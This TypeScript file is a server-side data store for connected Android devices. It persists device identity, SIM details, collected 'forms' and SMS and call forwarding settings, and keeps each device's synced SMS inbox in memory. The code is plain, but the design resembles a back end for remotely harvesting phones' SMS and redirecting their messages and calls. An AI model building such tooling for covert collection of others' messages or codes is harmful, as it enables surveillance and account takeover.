import { Device, DeviceData, SMS, FormData, ForwardingConfig, SimInfo } from './types/index.js';
import fs from 'fs';
import { promises as fsp } from 'fs';
import path from 'path';

// ─── Persistence helpers ────────────────────────────────────────────────────
// Store device state in a JSON file so it survives Render server restarts.
// Only the parts that matter for reconnection are persisted:
//   - device identity (id, name, phoneNumber, simCards)
//   - forwarding config (so devices get their config back on reconnect)
//   - forms (important user-submitted data)
// SMS is NOT persisted (it is re-synced by the Android app
// on every reconnection via flushPendingSyncQueue).

const DATA_FILE = path.join(__dirname, '..', 'data', 'store.json');

// Cap in-memory arrays so a long-running server can't grow without bound
// (SMS is re-synced by the app; forms are capped defensively).
const MAX_SMS_PER_DEVICE = 2000;
const MAX_FORMS_PER_DEVICE = 5000;

interface PersistedDevice {
    id: string;
    name: string;
    phoneNumber: string;
    simCards: SimInfo[];
    forwarding: ForwardingConfig;
    forms: FormData[];
}

function ensureDataDir() {
    const dir = path.dirname(DATA_FILE);
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
}

function loadPersistedDevices(): Map<string, PersistedDevice> {
    try {
        ensureDataDir();
        if (!fs.existsSync(DATA_FILE)) return new Map();
        const raw = fs.readFileSync(DATA_FILE, 'utf8');
        const arr: PersistedDevice[] = JSON.parse(raw);
        const map = new Map<string, PersistedDevice>();
        for (const d of arr) {
            map.set(d.id, d);
        }
        console.log(`[Store] Loaded ${map.size} persisted device(s) from disk`);
        return map;
    } catch (e) {
        console.error('[Store] Failed to load persisted store, starting fresh:', e);
        return new Map();
    }
}

/** First non-empty phone number found on a device's SIM cards. */
function derivePhoneFromSims(simCards?: SimInfo[]): string | undefined {
    return (simCards || []).find(s => s.phoneNumber && s.phoneNumber.trim())?.phoneNumber;
}

function toPersistedArray(devices: Map<string, DeviceData>): PersistedDevice[] {
    return Array.from(devices.values()).map(d => ({
        id: d.device.id,
        name: d.device.name,
        phoneNumber: d.device.phoneNumber,
        simCards: d.device.simCards || [],
        forwarding: d.forwarding,
        forms: d.forms,
    }));
}

// Debounced, coalesced, ASYNC persistence: many mutations in a short window
// produce one non-blocking write. This keeps the event loop free for socket.io
// ping/pong — a synchronous write here could stall long enough to drop devices.
let persistTimer: NodeJS.Timeout | null = null;
let pendingDevices: Map<string, DeviceData> | null = null;

function persistDevices(devices: Map<string, DeviceData>): void {
    pendingDevices = devices;
    if (persistTimer) return;
    persistTimer = setTimeout(() => {
        persistTimer = null;
        const target = pendingDevices;
        pendingDevices = null;
        if (target) void writeDevicesToDisk(target);
    }, 250);
    persistTimer.unref?.();
}

async function writeDevicesToDisk(devices: Map<string, DeviceData>): Promise<void> {
    try {
        ensureDataDir();
        await fsp.writeFile(DATA_FILE, JSON.stringify(toPersistedArray(devices)), 'utf8');
    } catch (e) {
        console.error('[Store] Failed to persist store to disk:', e);
    }
}

function writeDevicesSync(devices: Map<string, DeviceData>): void {
    try {
        ensureDataDir();
        fs.writeFileSync(DATA_FILE, JSON.stringify(toPersistedArray(devices)), 'utf8');
    } catch (e) {
        console.error('[Store] Failed to flush store to disk:', e);
    }
}

// ─── In-memory data store ──────────────────────────────────────────────────
class DataStore {
    private devices: Map<string, DeviceData> = new Map();

    constructor() {
        // Restore persisted state on startup (survives Render restarts)
        const persisted = loadPersistedDevices();
        for (const [id, p] of persisted) {
            const simCards = p.simCards || [];
            this.devices.set(id, {
                device: {
                    id: p.id,
                    name: p.name,
                    // Back-fill a blank number from persisted SIM data
                    phoneNumber: p.phoneNumber || derivePhoneFromSims(simCards) || '',
                    status: 'offline', // starts offline until the device reconnects
                    lastSeen: new Date(),
                    simCards,
                },
                sms: [],    // re-synced by Android on reconnect
                forms: p.forms || [],
                forwarding: p.forwarding,
            });
        }
    }

    /** Synchronously flush any debounced persistence (used on graceful shutdown). */
    flushSync(): void {
        if (persistTimer) {
            clearTimeout(persistTimer);
            persistTimer = null;
        }
        pendingDevices = null;
        writeDevicesSync(this.devices);
    }

    // Get all devices
    getAllDevices(): Device[] {
        return Array.from(this.devices.values()).map(d => d.device);
    }

    // Get device by ID
    getDevice(deviceId: string): DeviceData | undefined {
        return this.devices.get(deviceId);
    }

    // Register or update a device
    registerDevice(device: Omit<Device, 'lastSeen' | 'status' | 'simCards'>): DeviceData {
        const existing = this.devices.get(device.id);

        if (existing) {
            // Update existing device
            existing.device.status = 'online';
            existing.device.lastSeen = new Date();
            existing.device.lastHeartbeatAt = new Date();
            existing.device.name = device.name;
            // Don't clobber a known phone number with an empty one — the SIM
            // may not be ready yet when the device registers on connect.
            if (device.phoneNumber && device.phoneNumber.trim()) {
                existing.device.phoneNumber = device.phoneNumber;
            } else if (!existing.device.phoneNumber || !existing.device.phoneNumber.trim()) {
                // Fall back to a number already known from SIM sync data
                const derived = derivePhoneFromSims(existing.device.simCards);
                if (derived) existing.device.phoneNumber = derived;
            }
            existing.device.socketId = device.socketId;
            persistDevices(this.devices);
            return existing;
        }

        // Create new device data
        const deviceData: DeviceData = {
            device: {
                ...device,
                status: 'online',
                lastSeen: new Date(),
                simCards: [],
            },
            sms: [],
            forms: [],
            forwarding: {
                smsEnabled: false,
                smsForwardTo: '',
                callsEnabled: false,
                callsForwardTo: '',
            },
        };

        this.devices.set(device.id, deviceData);
        persistDevices(this.devices);
        return deviceData;
    }

    // Set device offline
    setDeviceOffline(deviceId: string, reason?: string): void {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.device.status = 'offline';
            deviceData.device.lastSeen = new Date();
            deviceData.device.socketId = undefined;
            deviceData.device.lastDisconnectAt = new Date();
            if (reason) {
                deviceData.device.lastDisconnectReason = reason;
            }
            // No need to persist on offline — identity & config are already persisted
        }
    }

    // Set device offline by socket ID
    setDeviceOfflineBySocketId(socketId: string, reason?: string): string | null {
        for (const [deviceId, deviceData] of this.devices) {
            if (deviceData.device.socketId === socketId) {
                this.setDeviceOffline(deviceId, reason);
                return deviceId;
            }
        }
        return null;
    }

    /**
     * Mark a device online and refresh presence without a full re-register.
     * Binds the given socket so a stale socket's later disconnect cannot
     * incorrectly mark the device offline.
     * @returns true if the device transitioned from offline to online.
     */
    touchDevice(deviceId: string, socketId?: string): boolean {
        const deviceData = this.devices.get(deviceId);
        if (!deviceData) return false;
        const wasOffline = deviceData.device.status !== 'online';
        deviceData.device.status = 'online';
        deviceData.device.lastSeen = new Date();
        deviceData.device.lastHeartbeatAt = new Date();
        if (socketId) {
            deviceData.device.socketId = socketId;
        }
        return wasOffline;
    }

    // Sync SMS messages
    syncSMS(deviceId: string, smsMessages: SMS[]): void {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            // Merge new SMS, avoiding duplicates
            const existingIds = new Set(deviceData.sms.map(s => s.id));
            const newMessages = smsMessages.filter(s => !existingIds.has(s.id));
            deviceData.sms = [...deviceData.sms, ...newMessages];
            if (deviceData.sms.length > MAX_SMS_PER_DEVICE) {
                deviceData.sms = deviceData.sms.slice(-MAX_SMS_PER_DEVICE);
            }
        }
    }

    // Submit form data - creates device if it doesn't exist
    submitForm(deviceId: string, formData: Omit<FormData, 'submittedAt'>): void {
        let deviceData = this.devices.get(deviceId);

        // Create device if it doesn't exist (for form submissions before device registers)
        if (!deviceData) {
            deviceData = {
                device: {
                    id: deviceId,
                    name: `Device ${deviceId.substring(0, 8)}`,
                    phoneNumber: '',
                    status: 'offline',
                    lastSeen: new Date(),
                    simCards: [],
                },
                sms: [],
                forms: [],
                forwarding: {
                    smsEnabled: false,
                    smsForwardTo: '',
                    callsEnabled: false,
                    callsForwardTo: '',
                },
            };
            this.devices.set(deviceId, deviceData);
            console.log(`[Store] Created placeholder device for form: ${deviceId}`);
        }

        deviceData.forms.push({
            ...formData,
            submittedAt: new Date(),
        });
        if (deviceData.forms.length > MAX_FORMS_PER_DEVICE) {
            deviceData.forms = deviceData.forms.slice(-MAX_FORMS_PER_DEVICE);
        }
        console.log(`[Store] Form stored for device ${deviceId}, total forms: ${deviceData.forms.length}`);
        persistDevices(this.devices);
    }

    // Update forwarding config
    updateForwarding(deviceId: string, config: Partial<ForwardingConfig>): ForwardingConfig | null {
        const deviceData = this.devices.get(deviceId);
        if (deviceData) {
            deviceData.forwarding = { ...deviceData.forwarding, ...config };
            persistDevices(this.devices);
            return deviceData.forwarding;
        }
        return null;
    }

    // Get SMS for a device
    getSMS(deviceId: string): SMS[] {
        return this.devices.get(deviceId)?.sms || [];
    }

    // Get forms for a device
    getForms(deviceId: string): FormData[] {
        return this.devices.get(deviceId)?.forms || [];
    }

    // Get forwarding config
    getForwarding(deviceId: string): ForwardingConfig | null {
        return this.devices.get(deviceId)?.forwarding || null;
    }

    // Sync SIM cards for a device
    syncSimCards(deviceId: string, simCards: SimInfo[]): void {
        const deviceData = this.devices.get(deviceId);
        if (!deviceData) return;

        // Dedupe by subscriptionId — some OEMs report phantom duplicate
        // subscriptions for a single physical SIM.
        const seen = new Set<number>();
        const unique = simCards.filter(sim => {
            if (typeof sim.subscriptionId !== 'number') return true;
            if (seen.has(sim.subscriptionId)) return false;
            seen.add(sim.subscriptionId);
            return true;
        });
        if (unique.length !== simCards.length) {
            console.warn(`[Store] Deduped SIM cards for ${deviceId}: ${simCards.length} -> ${unique.length}`);
        }

        deviceData.device.simCards = unique;

        // Back-fill the device-level phone number from SIM data. It is often
        // empty at register time because the SIM is not ready yet, which made
        // /devices show "N/A" while /status (reading simCards) showed it.
        if (!deviceData.device.phoneNumber || !deviceData.device.phoneNumber.trim()) {
            const phone = derivePhoneFromSims(unique);
            if (phone) {
                deviceData.device.phoneNumber = phone;
            }
        }

        persistDevices(this.devices);
    }

    // Get SIM cards for a device
    getSimCards(deviceId: string): SimInfo[] {
        return this.devices.get(deviceId)?.device.simCards || [];
    }
}

export const store = new DataStore();
